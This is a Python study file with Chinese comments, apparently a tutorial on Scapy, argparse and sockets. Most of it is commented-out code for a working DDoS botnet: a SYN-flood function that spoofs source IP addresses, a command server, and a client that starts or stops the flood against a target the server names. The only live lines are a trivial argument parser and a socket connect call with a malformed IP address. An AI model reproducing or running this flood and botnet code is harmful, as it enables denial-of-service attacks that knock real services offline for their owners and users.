#!/usr/bin/env python
#-*-coding:utf-8-*-

# import random
# from scapy.all import *
#
# def synFlood(tgt,dPort):
#     srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
#     for sPort in range(1024,65535):
#         index = random.randrange(4)
#         ipLayer = IP(src=srcList[index], dst=tgt)
#         tcpLayer = TCP(sport=sPort, dport=dPort,flags="S")
#         packet = ipLayer / tcpLayer
#         send(packet)




#导入argparse库
import argparse
#创建ArgumentParser对象
parser = argparse.ArgumentParser(description='Process some integers.')
#添加参数
parser.add_argument('-p', dest='port', type=int,
                   help='An port number!')
#解析命令行参数
args = parser.parse_args()
print('Port:',args.port)


#导入socket库
import socket

#创建socket:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#建立连接
s.connect(('192.168.0,100', 7786))




#服务器端完整代码

# import socket
# import argparse
# from threading import Thread
#
# socketList = []
# #命令格式'#-H xxx.xxx.xxx.xxx -p xxxx -c <start|stop>'
# #发送命令
# def sendCmd(cmd):
#     print('Send command......')
#     for sock in socketList:
#         sock.send(cmd.encode('utf-8'))
#
# #等待连接
# def waitConnect(s):
#     while True:
#         sock,addr = s.accept()
#         if sock not in socketList:
#             socketList.append(sock)
#
# def main():
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     s.bind(('0.0.0.0', 58868))
#     s.listen(1024)
#     t = Thread(target=waitConnect,args=(s,))
#     t.start()
#
#     print('Wait at least a client connection!')
#     while not len(socketList):
#         pass
#     print('It has been a client connection!')
#
#     while True:
#         print('=' * 50)
#         print('The command format:"#-H xxx.xxx.xxx.xxx -p xxxx -c <start>"')
#         #等待输入命令
#         cmd_str = input('Please input cmd:')
#         if len(cmd_str):
#             if cmd_str[0] == '#':
#                 sendCmd(cmd_str)
# if __name__ == '__main__':
#     main()



#客户端完整代码，需要root权限运行。
# #!/usr/bin/python3
# # -*- coding: utf-8 -*-
# import sys
# import socket
# import random
# import argparse
# from multiprocessing import Process
# from scapy.all import *
# import os
# isWorking = False
# curProcess = None
#
# #SYN泛洪攻击
# def synFlood(tgt,dPort):
#     print('='*100)
#     print('The syn flood is running!')
#     print('='*100)
#     srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
#     for sPort in range(1024,65535):
#         index = random.randrange(4)
#         ipLayer = IP(src=srcList[index], dst=tgt)
#         tcpLayer = TCP(sport=sPort, dport=dPort,flags="S")
#         packet = ipLayer / tcpLayer
#         send(packet)
#
# #命令格式'#-H xxx.xxx.xxx.xxx -p xxxx -c <start>'
# #处理命令
# def cmdHandle(sock,parser):
#     global curProcess
#     while True:
#         #接收命令
#         data = sock.recv(1024).decode('utf-8')
#         if len(data) == 0:
#             print('The data is empty')
#             return
#         if data[0] == '#':
#             try:
#                 #解析命令
#                 options = parser.parse_args(data[1:].split())
#                 m_host = options.host
#                 m_port = options.port
#                 m_cmd = options.cmd
#                 #DDoS启动命令
#                 if m_cmd.lower() == 'start':
#                     if curProcess != None and curProcess.is_alive():
#                         curProcess.terminate()
#                         curProcess = None
#                         os.system('clear')
#                     print('The synFlood is start')
#                     p = Process(target=synFlood,args=(m_host,m_port))
#                     p.start()
#                     curProcess = p
#                 #DDoS停止命令
#                 elif m_cmd.lower() =='stop':
#                     if curProcess.is_alive():
#                         curProcess.terminate()
#                         os.system('clear')
#             except:
#                 print('Failed to perform the command!')
#
# def main():
#     #添加需要解析的命令
#     p = argparse.ArgumentParser()
#     p.add_argument('-H', dest='host', type=str)
#     p.add_argument('-p', dest='port', type=int)
#     p.add_argument('-c', dest='cmd', type=str)
#     print("*" * 40)
#     try:
#         #创建socket对象
#         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#         #连接到服务器端
#         s.connect(('127.0.0.1',58868))
#         print('To connected server was success!')
#         print("=" * 40)
#         #处理命令
#         cmdHandle(s,p)
#     except:
#         print('The network connected failed!')
#         print('Please restart the script!')
#         sys.exit(0)
#
# if __name__ == '__main__':
#     main()


# 知识点：
#
# 使用Scapy实现SYN数据包
# Python中argparse的用法
# Python中socket的用法
# 使用socket实现客户端与服务器